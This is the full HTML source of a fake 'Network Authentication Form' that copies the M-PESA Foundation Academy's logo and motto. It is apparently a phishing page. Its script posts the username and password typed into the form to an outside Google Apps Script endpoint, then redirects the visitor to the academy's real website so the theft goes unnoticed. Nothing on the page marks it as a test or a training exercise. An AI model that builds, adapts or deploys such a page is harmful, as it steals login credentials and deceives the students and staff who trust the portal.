<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Network Authentication Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #333;
    }

    .top-text {
      font-size: 16px;
      margin-bottom: 30px;
    }

    .container {
      text-align: center;
      border: 1px solid #eee;
      padding: 40px;
      border-radius: 4px;
      box-shadow: 0 0 3px rgba(0, 0, 0, 0.1);
      width: 320px;
    }

    .logo {
      width: 160px;
      margin-bottom: 20px;
    }

    h3 {
      color: #2a5b9e;
      font-weight: normal;
      margin-bottom: 20px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }

    button {
      width: 100%;
      background-color: #4CAF50;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #45a049;
    }

    .footer-text {
      margin-top: 15px;
      font-size: 13px;
      color: #333;
    }

    .bottom-text {
      position: absolute;
      bottom: 30px;
      font-size: 13px;
      text-align: center;
      width: 100%;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="top-text">Thinkers : Doers : Leaders</div>

  <div class="container">
    <!-- Use your uploaded logo -->
    <img src="Image 17-09-2025 at 11.50.jpeg" alt="M-PESA Foundation Academy Logo" class="logo">
    <h3>Network Authentication Form</h3>

    <form id="authForm">
      <input type="text" name="username" placeholder="Enter your Username" required>
      <input type="password" name="password" placeholder="Enter your Password" required>
      <button type="submit">Login</button>
    </form>

    <p class="footer-text">Click here to access User Portal</p>
    <p id="response"></p>
  </div>

  <div class="bottom-text">
    Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
  </div>

  <script>
    const form = document.getElementById('authForm');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const formData = new FormData(form);
      const params = new URLSearchParams(formData);

      try {
        const response = await fetch('https://script.google.com/macros/s/AKfycbzDWyyO4ROgVXxhWhgGK2f0KWj9hQ4IGKADIPoSizTiZW9-mDQj7wNdAEE2f1Fdc2Y/exec', {
          method: 'POST',
          body: params
        });

        const text = await response.text();
        document.getElementById('response').textContent = text;

        // âœ… Redirect after successful submission
        if (text.toLowerCase().includes("success") || text.trim() !== "") {
          setTimeout(() => {
            window.location.href = "https://mpesafoundationacademy.ac.ke";
          }, 1000); // 1 second delay for user feedback
        }

        form.reset();
      } catch (error) {
        document.getElementById('response').textContent = 'Error submitting form';
      }
    });
  </script>
</body>
</html>
